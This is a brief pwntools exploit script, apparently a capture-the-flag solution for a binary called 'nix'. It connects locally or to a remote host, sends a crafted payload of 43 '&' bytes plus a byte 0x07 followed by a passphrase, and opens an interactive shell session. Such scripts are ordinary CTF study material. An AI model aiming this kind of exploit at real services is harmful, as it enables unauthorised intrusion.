#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("nix")
gs = """
brva 0x1401
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()

p.sendline(b'&'*43+b'\x07')

p.sendline(b'make every program a filter')

p.interactive()
